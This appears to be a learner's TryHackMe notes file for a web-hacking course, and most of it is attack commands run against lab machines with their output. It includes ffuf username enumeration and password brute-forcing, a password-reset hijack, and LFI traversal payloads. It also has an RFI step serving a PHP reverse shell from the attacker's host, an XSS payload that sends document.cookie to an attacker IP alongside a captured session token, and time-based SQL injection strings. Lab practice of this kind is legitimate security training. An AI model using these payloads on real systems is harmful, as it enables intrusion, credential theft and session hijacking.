+++
title = "Intro to Web Hacking"
+++
# https://tryhackme.com/path/outline/jrpenetrationtester

```bash
=================================
10.201.7.227 -- https://10-201-7-227.reverse-proxy-us-east-1.tryhackme.com/ -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.7.227' >> ~/.zshrc && source ~/.zshrc

2025-09-03 22:13:21 -- created user
tacoman
tacoman@email.com
Tacoman123

https://10-201-7-227.reverse-proxy-us-east-1.tryhackme.com/tmp.zip

=================================
10.201.39.96 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.39.96' >> ~/.zshrc && source ~/.zshrc

sniff framework:

# favicon database
https://wiki.owasp.org/index.php/OWASP_favicon_database

curl -o- http://$TARGET/robots.txt
curl -o- http://$TARGET/sitemap.xml
curl -v http://$TARGET
Trying 10.201.39.96:80...
* Connected to 10.201.39.96 (10.201.39.96) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.201.39.96
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 04 Sep 2025 02:56:16 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-FLAG: THM{HEADER_FLAG

2025-09-03 22:58:01 -- curl -I http://$TARGET
HTTP/1.1 404 Not Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 Sep 2025 02:58:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-FLAG: THM{HEADER_FLAG}

site:tryhackme.com filetype:pdf
site:tryhackme.com inurl:admin intitle:admin

# framework analyzer
https://www.wappalyzer.com/lookup/

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://$TARGET/FUZZ -o ffuf
// good

dirb http://$TARGET /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
// slow

gobuster dir --url http://10.201.39.96/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
// fast
/assets               (Status: 301) [Size: 178] [--> http://10.201.39.96/assets/]
/contact              (Status: 200) [Size: 3108]
/customers            (Status: 302) [Size: 0] [--> /customers/login]
/development.log      (Status: 200) [Size: 27]
/monthly              (Status: 200) [Size: 28]
/news                 (Status: 200) [Size: 2538]
/private              (Status: 301) [Size: 178] [--> http://10.201.39.96/private/]
/robots.txt           (Status: 200) [Size: 46]
/sitemap.xml          (Status: 200) [Size: 1383]

=================================
10.201.20.219 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.20.219' >> ~/.zshrc && source ~/.zshrc

### SUBDOMAIN SEARCH

# CA Cert search: lists subdomains registered
https://crt.sh/

# Google dork
site:*.domain.com -site:www.domain.com

=================================
$TARGET -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=$TARGET' >> ~/.zshrc && source ~/.zshrc

# FUZZING

username=admin&email=taco%40gmail.com&password=taco&cpassword=taco

ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$TARGET/customers/signup -mr "username already exists"
admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 122ms]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 124ms]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 132ms]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 143ms]

ffuf -w usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$TARGET/customers/login -fc 200
    * W1: steve
    * W2: thunder

# created account
taco
taco@man.com
tacoman
// taco@customer.acmeitsupport.thm

curl 'http://$TARGET/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=taco@customer.acmeitsupport.thm'
http://$TARGET/customers/reset/6b700c57bb09d213c9cbf257644c8aea

### Cookie tampering

curl http://$TARGET/cookie-test
curl -H "Cookie: logged_in=true; admin=false" http://$TARGET/cookie-test

# hash table lookup (only for non salted):
https://crackstation.net/

### Important for POSTing data (curl)

-H "Content-Type: application/x-www-form-urlencoded"

=================================
10.201.77.235 -- http://10.201.77.235 -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.77.235' >> ~/.zshrc && source ~/.zshrc

# challenge 1 (LFI)
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" http://$TARGET/challenges/chall1.php --data "file=../../../etc/flag1"
// success! note -X POST needs --data payload specified

# challenge 2 (LFI)
curl -o- "http://$TARGET/challenges/chall2.php" -b 'THM=../../../../etc/flag2%00'
// success! note the file traversal is in the cookie itself because the THM= value is is the includes/USER.php

# challenge 3 (LFI)
curl -o- -X POST http://$TARGET/challenges/chall3.php --data "file=/etc/flag3%00"
// success! same parameter but sent in POST (request) body instead of GET URL query; note old exploit null byte still needed to short circuit the extension .php

# challenge 4 (RFI)
nc -lnvp 54321
cd /tmp
cp /usr/share/webshells/php/php-reverse-shell.php taco.txt
# !!! EDIT CALLBACK IP AND PORT !!!
python3 -m http.server 80
curl -X GET http://$TARGET/playground.php?file=http://10.13.93.54/taco.txt

=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc

# SSRF
# use the '&x=' to short circuit the rest of the URL
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
=>
server.website.thm/flag?id=9

=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc

# XSS Scanner
https://github.com/adamjsturge/xsshunter-go

# XSS Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS POSSIBLE') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS POSSIBLE')//>\x3e

### RCE ###

## NOTE: had to use AttackerBox d/t netconfig
nc -vlnp 54321

cd /tmp
cp /usr/share/webshells/php/php-reverse-shell.php taco.txt
ip a ; python3 -m http.server 80

</textarea><script>fetch('http://10.13.93.54:54321?cookie=' + btoa(document.cookie) );</script> 

c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==
staff-session=4AB305E55955197693F01D6F8FD2D321
4AB305E55955197693F01D6F8FD2D321

=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc

# RACE Condition
BURP SUITE > Proxy tab > Intercept good POST request > HTTP History > Send to Repeater (the POST request) > Create tab group > Duplicate X times > Send group in parallel

=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc

### SQLi

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 where database() like 'sqli_four';--

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';--

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 FROM users;--

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username='admin' and password like '4%

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username='admin' and password like '4961';--

=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc

### BURP ###

- might have to add PortSwigger (burp) CA cert to browser if not using
  - https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox
- in Intercept, CTRL+U makes any added data URL safe (URL encoded)
- good idea to scope traffic (intercept only target): goto Proxy settings to enforce this

### SQLi via Burp (HTTP GET)

# First see how to get an HTTP 500 error by adding ' to end of the GET URL
GET /about/2'
// this particular examples spits out:
// Invalid statement: SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'
// so now we have the columns of the "people" table

# Now query the metadata of this table, since it has 5 columns we needed to maintain that width when structuring the query
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
// output:
//             About | id None
// a little confusing, but since it's the about page... "id" is the column_name in this case and None is because GET /about/0 requests an undefined product "0"

# Really we could skip the previous command, and use this to enumerate all the table columns
GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
// output:
// About | id,firstName,lastName,pfpLink,role,shortRole,bio,notes None
// now we have all the columns! notes is probably most interesting

# FINAL
GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people HTTP/1.1
// this gives us the flag
// NOTE: if the column "notes" is not at the beginning it risks being truncated from this particular server


=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc

### BURP EXTRAS

# Cyberchef (online de/en-coder):
- https://gchq.github.io/CyberChef/
```